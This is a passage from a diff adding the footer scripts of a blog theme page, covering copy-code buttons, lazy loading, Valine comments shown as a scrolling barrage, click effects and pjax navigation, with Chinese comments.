+    window.addEventListener('scroll', scrollCollect);
+    setHeaderClass();
+  })
+</script> 
+
+<!-- 渲染issues标签里的内容 -->
+<script>
+  function loadIssuesJS() {
+    if ($(".post-detail").find(".issues-api").length == 0) {
+      return;
+    } 
+    loadScript('/js/issues/index.js');
+  };
+  $(function () {
+    loadIssuesJS();
+  });
+  document.addEventListener('pjax:complete', function () {
+    if (typeof IssuesAPI == "undefined") {
+      loadIssuesJS();
+    }
+  })
+</script>
+
+<!-- 输入框打字特效 -->
+<!-- 输入框打字特效 -->
+
+  <script src="/js/activate-power-mode.js"></script>
+  <script>
+    POWERMODE.colorful = true;  // 打开随机颜色特效
+    POWERMODE.shake = false;    // 关闭输入框抖动
+    document.body.addEventListener('input', POWERMODE);//监听打字事件
+  </script>
+
+
+<!-- markdown代码一键复制功能 -->
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/v-plugs-ayu/lib/ayu.css">
+  <script src="https://cdn.jsdelivr.net/npm/v-plugs-ayu/lib/ayu.umd.min.js"></script>
+  <script src="/js/clipboard/clipboard.min.js"></script>
+  <div id="appCopy">
+  </div>
+  <script data-pjax>
+    var vm = new Vue({
+      el: '#appCopy',
+      data: {
+      },
+      computed: {
+      },
+      mounted() {
+        const that = this;
+        var copy = 'copy';
+        /* code */
+        var initCopyCode = function () {
+          var copyHtml = '';
+          copyHtml += '<button class="btn-copy" data-clipboard-snippet="" style="position:absolute;top:0;right:0;z-index:1;">';
+          copyHtml += '<i class="fas fa-copy"></i><span>' + copy + '</span>';
+          copyHtml += '</button>';
+          $(".post-detail pre").not('.gutter pre').wrap("<div class='codeBox' style='position:relative;width:100%;'></div>")
+          $(".post-detail pre").not('.gutter pre').before(copyHtml);
+          new ClipboardJS('.btn-copy', {
+            target: function (trigger) {
+              return trigger.nextElementSibling;
+            }
+          });
+        }
+        initCopyCode();
+        $('.btn-copy').unbind('click').bind('click', function () {
+          doSomething();
+        })
+        $(document).unbind('keypress').bind('keypress', function (e) {
+          if (e.ctrlKey && e.keyCode == 67) {
+            doSomething();
+          }
+        })
+
+        function doSomething() {
+          that.$notify({
+            title: "成功",
+            content: "copy that",
+            type: 'success'
+          })
+        }
+      },
+      methods: {
+      },
+      created() { }
+    })
+  </script>
+  
+
+<!-- 图片懒加载 -->
+<script defer src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.1.0/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazyload",
+    threshold: 0
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    lazyLoadInstance.update();
+  });
+  document.addEventListener('pjax:complete', function () {
+    lazyLoadInstance.update();
+  });
+</script>
+
+
+<!-- 卡片滚动动画 -->
+   
+
+<!-- 评论所需js -->
+
+  
+    <!-- 弹幕所需的css和js -->
+    
+<!-- 具体js，请前往valine/script.ejs查看 -->
+
+    <script>
+  var requiredFields = '';
+  requiredFields = requiredFields.split(',');
+  comment_el = '.comment';
+  let looperValine = null;
+  load_valine = function () {
+    if ($(comment_el).length) {
+      var valine = new Valine({
+        el: '#vcomment',
+        path: window.location.pathname,
+        notify: false,
+        verify: false,
+        app_id: "",
+        app_key: "",
+        placeholder: "客官，说点什么吧",
+        avatar: "",
+        master: "",   //博主邮箱md5
+        tagMeta: ["博主","小伙伴","访客"],     //标识字段名
+        friends: "",
+        metaPlaceholder: { "nick": "昵称/QQ号", "mail": "邮箱" },
+        requiredFields: requiredFields,
+        enableQQ: true,
+      });
+      function debounce(fn) {
+        var timerID = null
+        return function () {
+          var arg = arguments[0]   //获取事件
+          if (timerID) {
+            clearTimeout(timerID)
+          }
+          timerID = setTimeout(function () {
+            fn(arg)              //事件传入函数
+          }, 200)
+        }
+      }
+      //查询评论 valine.Q('*').limit(7) -- 查询所有，限制7条, 下面的的代码是查询当前页面
+      var themeDanmu = eval('false');
+      var themeLoop = eval('false');
+      var themeLooperTime = '5000' || 5000;
+      var speed = '40' || 20;
+      var isBarrager = true;
+      if (themeDanmu == true) {
+        do_barrager();
+        if ($('.danmuBox').length <= 0) {
+          $('.navbar').append('<div class="danmuBox"><div class="danmuBtn open"><span class="danmuCircle"></span><span class="danmuText">弹幕</span></div></div>');
+        }
+        $('.danmuBtn').on('click', debounce(
+          function () {
+            if ($('.danmuBtn').hasClass('open')) {
+              $('.danmuBtn').removeClass('open')
+              clearInterval(looperValine);
+              $.fn.barrager.removeAll();
+            } else {
+              $('.danmuBtn').addClass("open");
+              do_barrager();
+            }
+          }
+        ))
+      }
+      function do_barrager() {
+        isBarrager && valine.Q(window.location.pathname).find().then(function (comments) {
+          // var num = 0; // 可以记录条数，循环调用的时候只取最新的评论放入弹幕中
+          var run_once = true;
+          var looper_time = themeLooperTime;
+          var total = comments.length;
+          // var looper = null;
+          var index = 0;
+          if (total > 0) {
+            barrager();
+          } else {
+            // 当评论数为0的时候，自动关闭弹幕
+            // $('.danmuBtn').removeClass('open');
+          }
+          function barrager() {
+            if (run_once) {
+              //如果是首次执行,则设置一个定时器,并且把首次执行置为false
+              looperValine = setInterval(barrager, looper_time);
+              run_once = false;
+            }
+            var content = comments[index]._serverData.comment;
+            var email = comments[index]._serverData.mail;
+            var link = comments[index]._serverData.link;
+            var newcontent = content.substring(0, 50).replace(/<[^>]+>/g, "");
+            //发布一个弹幕
+            const item = {
+              img: `https://q1.qlogo.cn/g?b=qq&nk=${email}&s=640`, //图片 
+              info: newcontent, //文字 
+              href: link, //链接 
+              close: true, //显示关闭按钮 
+              speed: speed, //延迟,单位秒,默认6 
+              color: '#fff', //颜色,默认白色 
+              old_ie_color: '#000000', //ie低版兼容色,不能与网页背景相同,默认黑色
+            }
+            $('body').barrager(item);
+            //索引自增
+            index++;
+            //所有弹幕发布完毕，清除计时器。
+            if (index == total) {
+              clearInterval(looperValine);
+              if (themeLoop === true) {
+                setTimeout(function () {
+                  do_barrager();
+                }, 5000);
+              } else {
+                $('.danmuBtn').removeClass('open');
+              }
+              return false;
+            }
+
+          }
+        })
+      }
+    }
+  };
+  $(document).ready(load_valine);
+  document.addEventListener('pjax:send', function (e) {
+    
+  })
+  document.addEventListener('pjax:complete', function () {
+    load_valine();
+  });
+</script>
+
+  
+
+
+<!-- 鼠标点击特效 -->
+<!-- 爱心点击 -->
+
+  
+    <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 999; pointer-events: none;" ></canvas>
+    <script src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script>
+    <script src="/js/cursor/explosion.min.js"></script>
+  
+
+
+
+
+
+    <!-- pjax -->
+    
+
+<!-- pjax -->
+
+
+  <script src="/js/pjax@0.2.8/index.js"></script>
+  
+    <!-- 样式位于：source/css/_third-party/pjaxanimate.styl -->
+
+<div class="pjax-animate">
+  
+    <div class="loading-circle"><div id="loader-circle"></div></div>
+    <script>
+      window.ShowLoading = function() {
+        $(".loading-circle").css("display", "block");
+      };
+      window.HideLoading = function() {
+        $(".loading-circle").css("display", "none");
+      }
+    </script>
+  
+	<script>
+    document.addEventListener('pjax:complete', function () {
+      window.HideLoading();
+    })
+    document.addEventListener('pjax:send', function () {
+      window.ShowLoading();
+    })
+    document.addEventListener('pjax:error', function () {
+      window.HideLoading();
+    })
+	</script>
+</div>
+
+  
+
+  <script>
+    var pjax = new Pjax({
+      elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([no-pjax])',   // 拦截正常带链接的 a 标签
+      selectors: ["#pjax-container","title"],                                   // 根据实际需要确认重载区域
+      cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+      timeout: 5000
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      $(window).unbind('resize');
+      $(window).unbind('scroll');
+      $(document).unbind('scroll');
+      $(document).unbind('click');
+      $('body').unbind('click');
+
+    })
+    
+    document.addEventListener('pjax:complete', function () {
+      $('script[data-pjax], .pjax-reload script').each(function () {
+        $(this).parent().append($(this).remove());
+      });
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+      window.location.href = e.triggerElement.href;
+    })
+    
+    // 刷新不从顶部开始
+    document.addEventListener("DOMContentLoaded", function () {
+      history.scrollRestoration = 'auto';
+    })
+  </script>
+
+
+
+  </body>
+</html>
